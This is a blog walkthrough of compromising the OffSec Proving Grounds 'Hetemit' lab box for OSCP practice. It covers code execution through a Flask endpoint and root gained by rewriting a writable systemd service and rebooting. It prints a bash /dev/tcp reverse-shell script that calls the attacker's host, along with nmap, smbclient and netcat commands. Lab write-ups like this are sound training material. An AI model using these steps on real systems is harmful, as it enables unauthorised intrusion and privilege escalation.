+++
title = "OSCP Practise - Proving Grounds: Hetemit - Walkthrough"
author = ["Leo Oliver"]
date = 2023-09-02
tags = ["OSCP", "linux"]
categories = ["walkthrough"]
draft = false
+++

## OffSec Proving Grounds: Hetemit - Walkthrough {#offsec-proving-grounds-hetemit-walkthrough}

This post contains rough notes explaining my process for exploiting the Hetemit Proving Grounds box while preparing for the OSCP certification.


### My Process {#my-process}

Firstly I ran a port scan with nmap:

{{< bash-collapse >}}
sudo nmap -p- -T4 -A -sS --open 192.168.227.117
(o)# Nmap 7.94 scan initiated Sat Sep  2 16:44:42 2023 as: nmap -p- -T4 -A -sS -v --open -oA nmap 192.168.227.117
(o)Nmap scan report for 192.168.227.117
(o)Host is up (0.20s latency).
(o)Not shown: 65529 filtered tcp ports (no-response), 1 closed tcp port (reset)
(o)Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
(o)PORT      STATE SERVICE     VERSION
(o)21/tcp    open  ftp         vsftpd 3.0.3
(o)| ftp-anon: Anonymous FTP login allowed (FTP code 230)
(o)|_Can't get directory listing: TIMEOUT
(o)| ftp-syst:
(o)|   STAT:
(o)| FTP server status:
(o)|      Connected to 192.168.45.229
(o)|      Logged in as ftp
(o)|      TYPE: ASCII
(o)|      No session bandwidth limit
(o)|      Session timeout in seconds is 300
(o)|      Control connection is plain text
(o)|      Data connections will be plain text
(o)|      At session startup, client count was 3
(o)|      vsFTPd 3.0.3 - secure, fast, stable
(o)|_End of status
(o)22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
(o)| ssh-hostkey:
(o)|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
(o)|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
(o)|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
(o)139/tcp   open  netbios-ssn Samba smbd 4.6.2
(o)445/tcp   open  netbios-ssn Samba smbd 4.6.2
(o)50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
(o)|_http-title: Site doesn't have a title (text/html; charset=utf-8).
(o)|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
(o)| http-methods:
(o)|_  Supported Methods: HEAD GET OPTIONS
(o)Device type: general purpose|storage-misc|firewall|webcam
(o)Running (JUST GUESSING): Linux 4.X|3.X|2.6.X (91%), Synology DiskStation Manager 5.X (86%), WatchGuard Fireware 11.X (85%), Tandberg embedded (85%)
(o)OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:watchguard:fireware:11.8 cpe:/h:tandberg:vcs
(o)Aggressive OS guesses: Linux 4.4 (91%), Linux 3.10 - 3.12 (90%), Linux 4.9 (89%), Linux 4.0 (87%), Linux 3.11 - 4.1 (86%), Linux 3.10 - 3.16 (86%), Linux 2.6.32 (86%), Linux 3.4 (86%), Linux 3.5 (86%), Linux 4.2 (86%)
(o)No exact OS matches for host (test conditions non-ideal).
(o)Uptime guess: 36.862 days (since Thu Jul 27 20:08:44 2023)
(o)Network Distance: 4 hops
(o)TCP Sequence Prediction: Difficulty=263 (Good luck!)
(o)IP ID Sequence Generation: All zeros
(o)Service Info: OS: Unix
(o)
(o)Host script results:
(o)| smb2-time:
(o)|   date: 2023-09-02T04:48:51
(o)|_  start_date: N/A
(o)| smb2-security-mode:
(o)|   3:1:1:
(o)|_    Message signing enabled but not required
(o)|_clock-skew: -1s
(o)
(o)TRACEROUTE (using port 22/tcp)
(o)HOP RTT       ADDRESS
(o)1   204.39 ms 192.168.45.1
(o)2   204.35 ms 192.168.45.254
(o)3   205.01 ms 192.168.251.1
(o)4   204.83 ms 192.168.227.117
(o)
(o)Read data files from: /usr/bin/../share/nmap
(o)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
(o)# Nmap done at Sat Sep  2 16:49:29 2023 -- 1 IP address (1 host up) scanned in 287.63 seconds
{{< /bash-collapse >}}

Then I tried to enumerate SMB shares using null authentication.

{{< bash-code >}}
crackmapexec smb 192.168.227.117 -u '' -p '' --shares
(o)SMB         192.168.227.117 445    HETEMIT          [*] Windows 6.1 Build 0 (name:HETEMIT) (domain:) (signing:False) (SMBv1:False)
(o)SMB         192.168.227.117 445    HETEMIT          [+] \:
(o)SMB         192.168.227.117 445    HETEMIT          [+] Enumerated shares
(o)SMB         192.168.227.117 445    HETEMIT          Share           Permissions     Remark
(o)SMB         192.168.227.117 445    HETEMIT          -----           -----------     ------
(o)SMB         192.168.227.117 445    HETEMIT          print$                          Printer Drivers
(o)SMB         192.168.227.117 445    HETEMIT          Cmeeks                          cmeeks Files
(o)SMB         192.168.227.117 445    HETEMIT          IPC$                            IPC Service (Samba 4.11.2)
{{< /bash-code >}}

The null authentication was successful and when listing the shares other than the standard SMB shares there was an additional share called `Cmeeks`.
So I tried to connect to this share using `smbclient`.

{{< bash-code >}}
smbclient //192.168.227.117/Cmeeks
(o)Password for [WORKGROUP\leo]:
(o)Anonymous login successful
(o)Try "help" to get a list of possible commands.
(o)smb: \> ls
(o)NT_STATUS_ACCESS_DENIED listing \*
(o)smb: \> put test.txt
(o)NT_STATUS_ACCESS_DENIED opening remote file \test.txt
(o)smb: \>
{{< /bash-code >}}

Unfortunately we have no read or write permissions.

I then connected to FTP using anonymous authentication. Again, I could authenticate anonymously but had no read or write permissions.

So the next interesting port to focus on was port 50000 which nmap identified as a Werkzeug (flask) HTTP server.

I connected to the port in my browser and was returned the potential endpoints `/verify` and `/generate`:
![](/ox-hugo/2023-09-02_18-07-04_screenshot.png)

The verify endpoint returned a response indicating that it accepted a parameter called `code`.
So I tried to add a HTTP GET parameter called code:
![](/ox-hugo/2023-09-02_18-05-31_screenshot.png)
This still returned the same response.

The next step was to try sending the `code` parameter as an HTTP post parameter.
To do that I used burp and changed the HTTP request method to a post request:
![](/ox-hugo/2023-09-02_18-20-04_screenshot.png)
The server then returned a 500 error, so maybe the code triggered an exception.

I then tried to insert some Python code since Werkzeug runs on Python:
![](/ox-hugo/2023-09-02_18-21-00_screenshot.png)
This returns None which indicates that the server is executing the code parameter and displaying what the function returns since the `print()` function returns None.

I confirmed this by trying to execute some code that would return True (None==None):
![](/ox-hugo/2023-09-02_18-22-04_screenshot.png)
True is returned confirming we have code execution.

Next I inserted some python code to execute System commands using the `os` module. I attempted to execute the `wget` command and reach back to my own HTTP server so that I could observe if the command was executed successfully:
![](/ox-hugo/2023-09-02_18-25-56_screenshot.png)

I received a connection back to my webserver which showed I had command execution:

{{< bash-code >}}
sudo python3 -m http.server 80
(o)Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
(o)192.168.227.117 - - [02/Sep/2023 18:25:24] code 404, message File not found
(o)192.168.227.117 - - [02/Sep/2023 18:25:24] "GET /test HTTP/1.1" 404 -
{{< /bash-code >}}

At this point I used the command execution to get a bash reverse shell:
![](/ox-hugo/2023-09-02_18-34-29_screenshot.png)

And I received the shell as the user cmeeks:

{{< bash-code >}}
nc -nlvp 80
(o)listening on [any] 80 ...
(o)connect to [192.168.45.229] from (UNKNOWN) [192.168.227.117] 36708
(o)bash: cannot set terminal process group (1022): Inappropriate ioctl for device
(o)bash: no job control in this shell
[cmeeks@hetemit restjson_hetemit]$ whoami
(o)whoami
(o)cmeeks
{{< /bash-code >}}

I ran `sudo -l` and saw that I had privileges to reboot the machine, which I noted as being intersting. If there was a overwritable service then having this privilege would allow me to reboot the system and when the system reboots the service would execute my command.

{{< bash-code >}}
[cmeeks@hetemit ~]$ sudo -l
sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
{{< /bash-code >}}

I looked into the local services running:

{{< bash-code >}}
[cmeeks@hetemit restjson_hetemit]$ netstat -anlp
(o)netstat -anlp
(o)(Not all processes could be identified, non-owned process info
(o) will not be shown, you would have to be root to see it all.)
(o)Active Internet connections (servers and established)
(o)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
(o)tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
(o)tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -
(o)tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
(o)tcp        0      0 0.0.0.0:18000           0.0.0.0:*               LISTEN      1020/puma 4.3.6 (tc
(o)tcp        0      0 0.0.0.0:50000           0.0.0.0:*               LISTEN      1022/python3.6
(o)tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
(o)tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
(o)tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
(o)tcp        0      0 192.168.227.117:50000   192.168.45.229:41038    ESTABLISHED 1022/python3.6
(o)tcp        0      0 192.168.227.117:36708   192.168.45.229:80       ESTABLISHED 122263/bash
(o)tcp        0      0 192.168.227.117:51014   192.168.45.229:22       ESTABLISHED 122631/ssh
(o)tcp        0    139 192.168.227.117:59888   192.168.45.229:21       ESTABLISHED 122648/bash
(o)tcp        1      0 192.168.227.117:50000   192.168.45.229:43920    CLOSE_WAIT  1022/python3.6
(o)tcp6       0      0 :::445                  :::*                    LISTEN      -
(o)tcp6       0      0 :::5355                 :::*                    LISTEN      -
(o)tcp6       0      0 :::139                  :::*                    LISTEN      -
(o)tcp6       0      0 :::22                   :::*                    LISTEN      -
(o)udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
(o)udp        0      0 127.0.0.1:43404         127.0.0.1:43404         ESTABLISHED -
(o)udp        0      0 0.0.0.0:5355            0.0.0.0:*                           -
(o)udp6       0      0 :::5355                 :::*                                -
(o)raw6       0      0 :::58                   :::*                    7           -
{{< /bash-code >}}

I was curious about the local service running on port 18000 so I started an ssh remote port forward with my kali machine:

{{< bash-code >}}
[cmeeks@hetemit restjson_hetemit]$ ssh -N -R 127.0.0.1:8000:127.0.0.1:18000 leo@192.168.45.229
(o)The authenticity of host '192.168.45.229 (192.168.45.229)' can't be established.
(o)ECDSA key fingerprint is SHA256:YJptmZS+Cy7dR1m9KUljL/0oK9nE95OFQoiQ7q3MTzo.
(o)Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
(o)Warning: Permanently added '192.168.45.229' (ECDSA) to the list of known hosts.
{{< /bash-code >}}

This then allowed me to connect to the service through my browser:
![](/ox-hugo/2023-09-02_19-47-06_screenshot.png)

This was intersting but since the web service on port 18000 was being run from the user `cmeeks`, exploiting this service didnt seem like it would offer a path to escalate privileges to root.

So I then focused on finding an overwritable system service that I could use to trigger a command with my reboot privilege.

I used find to recursively search for writable files in the /etc directory. This revealed that the `pythonapp.service` was writable. Inspecting this service file showed that it was currently executing the `flask` command as the user `cmeeks`. So if I changed this to execute a reverse shell command as the `root` user then it would be executed when the server got rebooted.

{{< bash-code >}}
[cmeeks@hetemit restjson_hetemit]$ find /etc -writable 2>/dev/null
(o)find /etc -writable 2>/dev/null
(o)/etc/systemd/system/multi-user.target.wants/pythonapp.service
(o)/etc/systemd/system/systemd-timedated.service
(o)/etc/systemd/system/pythonapp.service
[cmeeks@hetemit restjson_hetemit]$ cat /etc/systemd/system/pythonapp.service
(o)cat /etc/systemd/system/pythonapp.service
(o)[Unit]
(o)Description=Python App
(o)After=network-online.target
(o)
(o)[Service]
(o)Type=simple
(o)WorkingDirectory=/home/cmeeks/restjson_hetemit
(o)ExecStart=flask run -h 0.0.0.0 -p 50000
(o)TimeoutSec=30
(o)RestartSec=15s
(o)User=cmeeks
(o)ExecReload=/bin/kill -USR1 $MAINPID
(o)Restart=on-failure
(o)
(o)[Install]
(o)WantedBy=multi-user.target
{{< /bash-code >}}

I created a script that had a reverse shell payload in it and saved it to as `/home/cmeeks/revshell.sh`.

{{< highlight bash "hl_lines=1" >}}
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.229/80 0>&1
{{< /highlight >}}

I then gave the script execute permissions:

{{< bash-code >}}
[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/revshell.sh
{{< /bash-code >}}

Then I used echo to write the updated service file to the `/etc/systemd/system/pythonapp.service` file. I changed the `ExecStart` and `User` values to execute the reverse shell script as the root user.

{{< bash-code >}}
[cmeeks@hetemit ~]$ echo "[Unit]
(o)>Description=Python App
(o)>After=network-online.target
(o)>
(o)>[Service]
(o)>Type=simple
(o)>WorkingDirectory=/home/cmeeks/restjson_hetemit
(o)>ExecStart=/home/cmeeks/revshell.sh
(o)>TimeoutSec=30
(o)>RestartSec=15s
(o)>User=root
(o)>ExecReload=/bin/kill -USR1 $MAINPID
(o)>Restart=on-failure
(o)>
(o)>[Install]
(o)>WantedBy=multi-user.target
(o)> " > /etc/systemd/system/pythonapp.service
{{< /bash-code >}}

Then I rebooted the machine using my sudo access:

{{< bash-code >}}
[cmeeks@hetemit ~]$ sudo /sbin/reboot
{{< /bash-code >}}

On my kali machine I listened for the reverse shell. When I received the reverse shell I had a shell as the root user:

{{< bash-code >}}
nc -nlvp 80
(o)listening on [any] 80 ...
(o)connect to [192.168.45.229] from (UNKNOWN) [192.168.227.117] 55198
(o)bash: cannot set terminal process group (1206): Inappropriate ioctl for device
(o)bash: no job control in this shell
(o)[root@hetemit restjson_hetemit]# whoami
(o)whoami
(o)root
{{< /bash-code >}}
